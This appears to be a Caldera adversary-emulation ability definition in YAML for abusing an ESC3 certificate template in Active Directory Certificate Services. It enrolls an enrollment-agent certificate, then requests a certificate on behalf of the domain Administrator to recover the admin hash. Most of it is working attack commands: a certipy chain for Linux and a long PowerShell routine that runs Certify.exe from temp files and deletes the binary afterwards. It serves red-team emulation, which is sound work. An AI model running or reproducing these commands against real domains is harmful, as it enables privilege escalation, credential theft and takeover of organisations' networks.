- id: 53f2175d-d16d-41c6-bce3-fb573f83ca79
  name: 'ADCS ESC3: Enrollment Agent On-Behalf-Of Administrator'
  description: |
    Abuse an ESC3 template (Certificate Request Agent EKU) as a two-step enrollment-agent chain: request an enrollment-agent certificate, use it to enroll on behalf of the domain administrator against esc.target.template, then UnPAC-the-Hash to recover the admin NT hash. Fires only when enumeration produced esc3.template.name facts.

    Note: certipy flags an Any Purpose (ESC2) template as ALSO ESC3, so esc3.template.name commonly holds more than one value and the planner spawns one link per value. Both succeed by different routes; output filenames embed the template name so links never overwrite each other.

    Linux: certipy two-step enrollment-agent chain.

    Windows executor: Certify.exe is delivered via the Caldera payload system. The executor reads the bytes, immediately deletes the delivered file, writes to a random temp path, and runs Certify as a child process via [Diagnostics.Process]::Start() with stdout redirected. The temp binary is deleted after the process exits. Output is captured to a temp file and parsed by the parent. Process.Start was chosen over Assembly.Load/LoadFrom because it resolves COM interop dependencies (CERTENROLLLib used by Certify request) and handles architecture matching natively, working correctly on both Win10 and Win11. Two Certify invocations run sequentially: step 1 requests the enrollment-agent cert; step 2 uses /onbehalfof and /enrollcert against esc.target.template. The final PFX is emitted as esc.cert.pfx for the auth ability.
  tactic: privilege-escalation
  technique:
    attack_id: T1649
    name: Steal or Forge Authentication Certificates
  platforms:
    linux:
      sh:
        command: |
          cd /tmp; rm -f "adcs_esc3_#{esc3.template.name}_agent.pfx" "adcs_esc3_#{esc3.template.name}.pfx" "adcs_esc3_#{esc3.template.name}.log"; certipy req -u '#{esc.domain.user}@#{esc.domain.fqdn}' -p '#{esc.domain.password}' -dc-ip '#{esc.domain.dc_ip}' -target '#{esc.ca.host}' -target-ip '#{esc.ca.ip}' -ca '#{esc3.ca.name}' -template '#{esc3.template.name}' -out "adcs_esc3_#{esc3.template.name}_agent" >"adcs_esc3_#{esc3.template.name}.log" 2>&1; [ -f "/tmp/adcs_esc3_#{esc3.template.name}_agent.pfx" ] || { echo "ESC3 STEP 1 FAILED: could not enroll agent cert from template #{esc3.template.name} on CA #{esc3.ca.name}" >&2; cat "adcs_esc3_#{esc3.template.name}.log" >&2; exit 1; }; certipy req -u '#{esc.domain.user}@#{esc.domain.fqdn}' -p '#{esc.domain.password}' -dc-ip '#{esc.domain.dc_ip}' -target '#{esc.ca.host}' -target-ip '#{esc.ca.ip}' -ca '#{esc3.ca.name}' -template '#{esc.target.template}' -on-behalf-of '#{esc.domain.netbios}\Administrator' -pfx "/tmp/adcs_esc3_#{esc3.template.name}_agent.pfx" -out "adcs_esc3_#{esc3.template.name}" >>"adcs_esc3_#{esc3.template.name}.log" 2>&1; [ -f "/tmp/adcs_esc3_#{esc3.template.name}.pfx" ] || { echo "ESC3 STEP 2 FAILED: agent cert enrolled OK, but CA rejected on-behalf-of for #{esc.domain.netbios}\Administrator against target template #{esc.target.template}" >&2; cat "adcs_esc3_#{esc3.template.name}.log" >&2; exit 1; }; echo "/tmp/adcs_esc3_#{esc3.template.name}.pfx"
        cleanup: |
          rm -f "/tmp/adcs_esc3_#{esc3.template.name}_agent.pfx" "/tmp/adcs_esc3_#{esc3.template.name}.pfx" "/tmp/adcs_esc3_#{esc3.template.name}.log"
        timeout: 300
        parsers:
          plugins.stockpile.app.parsers.esc_pfx:
          - source: esc.cert.pfx
    windows:
      psh:
        command: |
          $cwd=[IO.Directory]::GetCurrentDirectory(); $tpl='#{esc3.template.name}'; $pfxPath=Join-Path $cwd ('adcs_esc3_'+$tpl+'_win.pfx'); Remove-Item $pfxPath -EA SilentlyContinue; $cp=Join-Path $cwd 'Certify.exe'; $cb=[IO.File]::ReadAllBytes($cp); Remove-Item $cp -Force -EA SilentlyContinue; $bf1=[IO.Path]::GetTempFileName(); [IO.File]::WriteAllBytes($bf1,$cb); $tf1=[IO.Path]::GetTempFileName(); $step1Args=@("request","/ca:#{esc.ca.host}\#{esc3.ca.name}","/template:$tpl"); $j1=Start-Job -ScriptBlock {param([string]$bfile,[string[]]$a,[string]$tfile) $psi=New-Object Diagnostics.ProcessStartInfo($bfile,($a -join ' ')); $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $psi.UseShellExecute=$false; $psi.CreateNoWindow=$true; $proc=[Diagnostics.Process]::Start($psi); $stdout=$proc.StandardOutput.ReadToEnd(); $proc.WaitForExit(); Remove-Item $bfile -Force -EA SilentlyContinue; [IO.File]::WriteAllText($tfile,$stdout)} -ArgumentList $bf1,$step1Args,$tf1; Wait-Job $j1|Out-Null; Remove-Job $j1; Remove-Item $bf1 -Force -EA SilentlyContinue; $pem1=[IO.File]::ReadAllText($tf1); Remove-Item $tf1 -Force; $km1=[regex]::Match($pem1,'(?s)-----BEGIN RSA PRIVATE KEY-----(.*?)-----END RSA PRIVATE KEY-----'); $cm1=[regex]::Match($pem1,'(?s)-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----'); if(-not $km1.Success -or -not $cm1.Success){ Write-Error 'ESC3 WINDOWS STEP 1 FAILED: Certify returned no PEM for agent cert from template #{esc3.template.name}'; Write-Output $pem1; exit 1 }; $keyDer=[Convert]::FromBase64String(($km1.Groups[1].Value -replace '\s','')); $certDer=[Convert]::FromBase64String(($cm1.Groups[1].Value -replace '\s','')); function Read-DerLength { param([byte[]]$Data,[ref]$Offset) $first=$Data[$Offset.Value]; $Offset.Value++; if($first -lt 0x80){ return $first }; $numBytes=$first -band 0x7F; $len=0; for($i=0;$i -lt $numBytes;$i++){ $len=($len -shl 8) -bor $Data[$Offset.Value]; $Offset.Value++ }; return $len }; function Read-DerInteger { param([byte[]]$Data,[ref]$Offset) if($Data[$Offset.Value] -ne 0x02){ throw 'bad INTEGER' }; $Offset.Value++; $len=Read-DerLength -Data $Data -Offset $Offset; $bytes=New-Object byte[] $len; [Array]::Copy($Data,$Offset.Value,$bytes,0,$len); $Offset.Value+=$len; if($bytes.Length -gt 1 -and $bytes[0] -eq 0x00){ $tmp2=New-Object byte[] ($bytes.Length-1); [Array]::Copy($bytes,1,$tmp2,0,$tmp2.Length); $bytes=$tmp2 }; return ,$bytes }; function Pad-Left { param([byte[]]$Bytes,[int]$Length) if($Bytes.Length -eq $Length){ return ,$Bytes }; if($Bytes.Length -gt $Length){ throw 'too long' }; $out=New-Object byte[] $Length; [Array]::Copy($Bytes,0,$out,$Length-$Bytes.Length,$Bytes.Length); return ,$out }; $agentPfxPath=[IO.Path]::GetTempFileName(); $off=[ref]0; if($keyDer[$off.Value] -ne 0x30){ throw 'not SEQUENCE' }; $off.Value++; [void](Read-DerLength -Data $keyDer -Offset $off); [void](Read-DerInteger -Data $keyDer -Offset $off); $n=Read-DerInteger -Data $keyDer -Offset $off; $e=Read-DerInteger -Data $keyDer -Offset $off; $d=Read-DerInteger -Data $keyDer -Offset $off; $p=Read-DerInteger -Data $keyDer -Offset $off; $q=Read-DerInteger -Data $keyDer -Offset $off; $dp=Read-DerInteger -Data $keyDer -Offset $off; $dq=Read-DerInteger -Data $keyDer -Offset $off; $qi=Read-DerInteger -Data $keyDer -Offset $off; $ml=$n.Length; $hl=[int][Math]::Ceiling($ml/2.0); $rp=New-Object System.Security.Cryptography.RSAParameters; $rp.Modulus=Pad-Left -Bytes $n -Length $ml; $rp.Exponent=$e; $rp.D=Pad-Left -Bytes $d -Length $ml; $rp.P=Pad-Left -Bytes $p -Length $hl; $rp.Q=Pad-Left -Bytes $q -Length $hl; $rp.DP=Pad-Left -Bytes $dp -Length $hl; $rp.DQ=Pad-Left -Bytes $dq -Length $hl; $rp.InverseQ=Pad-Left -Bytes $qi -Length $hl; $rsa=New-Object System.Security.Cryptography.RSACryptoServiceProvider; $rsa.ImportParameters($rp); $cert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$certDer); $ck=[System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($cert,$rsa); $pfxBytes=$ck.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx,''); [System.IO.File]::WriteAllBytes($agentPfxPath,$pfxBytes); if(-not (Test-Path $agentPfxPath)){ Write-Error 'ESC3 WINDOWS STEP 1: agent PFX conversion failed'; exit 1 }; $bf2=[IO.Path]::GetTempFileName(); [IO.File]::WriteAllBytes($bf2,$cb); $tf2=[IO.Path]::GetTempFileName(); $step2Args=@("request","/ca:#{esc.ca.host}\#{esc3.ca.name}","/template:#{esc.target.template}","/onbehalfof:#{esc.domain.netbios}\Administrator","/enrollcert:$agentPfxPath"); $j2=Start-Job -ScriptBlock {param([string]$bfile,[string[]]$a,[string]$tfile) $psi=New-Object Diagnostics.ProcessStartInfo($bfile,($a -join ' ')); $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $psi.UseShellExecute=$false; $psi.CreateNoWindow=$true; $proc=[Diagnostics.Process]::Start($psi); $stdout=$proc.StandardOutput.ReadToEnd(); $proc.WaitForExit(); Remove-Item $bfile -Force -EA SilentlyContinue; [IO.File]::WriteAllText($tfile,$stdout)} -ArgumentList $bf2,$step2Args,$tf2; Wait-Job $j2|Out-Null; Remove-Job $j2; Remove-Item $bf2 -Force -EA SilentlyContinue; Remove-Item $agentPfxPath -Force -EA SilentlyContinue; $pem2=[IO.File]::ReadAllText($tf2); Remove-Item $tf2 -Force; $km2=[regex]::Match($pem2,'(?s)-----BEGIN RSA PRIVATE KEY-----(.*?)-----END RSA PRIVATE KEY-----'); $cm2=[regex]::Match($pem2,'(?s)-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----'); if(-not $km2.Success -or -not $cm2.Success){ Write-Error 'ESC3 WINDOWS STEP 2 FAILED: Certify returned no PEM for admin cert (check agent cert was enrollment-agent capable and #{esc.target.template} is a valid target)'; Write-Output $pem2; exit 1 }; $keyDer=[Convert]::FromBase64String(($km2.Groups[1].Value -replace '\s','')); $certDer=[Convert]::FromBase64String(($cm2.Groups[1].Value -replace '\s','')); $off=[ref]0; if($keyDer[$off.Value] -ne 0x30){ throw 'not SEQUENCE' }; $off.Value++; [void](Read-DerLength -Data $keyDer -Offset $off); [void](Read-DerInteger -Data $keyDer -Offset $off); $n=Read-DerInteger -Data $keyDer -Offset $off; $e=Read-DerInteger -Data $keyDer -Offset $off; $d=Read-DerInteger -Data $keyDer -Offset $off; $p=Read-DerInteger -Data $keyDer -Offset $off; $q=Read-DerInteger -Data $keyDer -Offset $off; $dp=Read-DerInteger -Data $keyDer -Offset $off; $dq=Read-DerInteger -Data $keyDer -Offset $off; $qi=Read-DerInteger -Data $keyDer -Offset $off; $ml=$n.Length; $hl=[int][Math]::Ceiling($ml/2.0); $rp=New-Object System.Security.Cryptography.RSAParameters; $rp.Modulus=Pad-Left -Bytes $n -Length $ml; $rp.Exponent=$e; $rp.D=Pad-Left -Bytes $d -Length $ml; $rp.P=Pad-Left -Bytes $p -Length $hl; $rp.Q=Pad-Left -Bytes $q -Length $hl; $rp.DP=Pad-Left -Bytes $dp -Length $hl; $rp.DQ=Pad-Left -Bytes $dq -Length $hl; $rp.InverseQ=Pad-Left -Bytes $qi -Length $hl; $rsa=New-Object System.Security.Cryptography.RSACryptoServiceProvider; $rsa.ImportParameters($rp); $cert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$certDer); $ck=[System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($cert,$rsa); $pfxBytes=$ck.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx,''); [System.IO.File]::WriteAllBytes($pfxPath,$pfxBytes); if(Test-Path $pfxPath){ Write-Output $pfxPath } else { Write-Error 'ESC3 WINDOWS FAILED: admin PFX not written'; exit 1 }
        cleanup: |
          $cwd=[IO.Directory]::GetCurrentDirectory(); Get-ChildItem -Path (Join-Path $cwd 'adcs_esc3_*_win.pfx') -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue; exit 0
        timeout: 600
        payloads:
        - Certify.exe
        parsers:
          plugins.stockpile.app.parsers.esc_pfx:
          - source: esc.cert.pfx
